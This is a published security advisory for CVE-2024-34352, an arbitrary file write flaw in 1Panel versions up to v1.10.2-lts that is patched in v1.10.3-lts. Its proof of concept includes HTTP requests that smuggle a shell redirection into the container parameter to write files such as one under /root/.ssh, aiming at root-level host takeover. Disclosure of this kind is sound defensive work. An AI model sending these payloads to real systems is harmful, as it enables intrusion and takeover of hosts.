# Arbitrary file write vulnerability in 1Panel

Moderate

[wanghe-fit2cloud](/wanghe-fit2cloud)
published
GHSA-f8ch-w75v-c847
May 9, 2024

## Package

No package listed

## Affected versions

<= v1.10.2-lts

## Patched versions

 v1.10.3-lts

## Description

### Summary

There are many command injections in the project, and some of them are not well filtered, leading to arbitrary file writes, and ultimately leading to RCEs.

We can use the following mirror configuration write symbol `>` to achieve arbitrary file writing

### PoC

Dockerfile

```
FROM bash:latest

COPY echo.sh /usr/local/bin/echo.sh
RUN chmod +x /usr/local/bin/echo.sh
CMD ["echo.sh"]

```

echo.sh

```
#!/usr/local/bin/bash
echo "Hello, World!"

```

Build this image like this, upload it to dockerhub, and then 1panel pulls the image to build the container

Send the following packet, taking care to change the containerID to the malicious container we constructed

```
GET /api/v1/containers/search/log?container=6e6308cb8e4734856189b65b3ce2d13a69e87d2717898d120dac23b13b6f1377%3E%2Ftmp%2F1&since=all&tail=100&follow=true HTTP/1.1
Host: xxxx:42713
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Upgrade: websocket
Origin: http://xxx:42713
Sec-WebSocket-Version: 13

Cookie: psession=88e51389-ddce-468c-a3be-51c5b2cb2d9d
Sec-WebSocket-Key: FdXBKFviqO4+LSEoucITLA==

```

Then you can write any customized file to, for example, a ssh key, and generally the application is run with root privileges

```
GET /api/v1/containers/search/log?container=6e6308cb8e4734856189b65b3ce2d13a69e87d2717898d120dac23b13b6f1377%3E%2Froot%2F.ssh%2f1&since=all&tail=100&follow=true HTTP/1.1

Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36

Sec-WebSocket-Key: FdXBKFviqO4+LSEoucITLA==

```

Or write a timed task to execute any command.

### Impact

The ability to write arbitrary files on the host where the service is deployed can lead to a host takeover

### Severity

Moderate

### CVE ID

CVE-2024-34352

### Weaknesses

[CWE-77](/advisories?query=cwe%3A77)
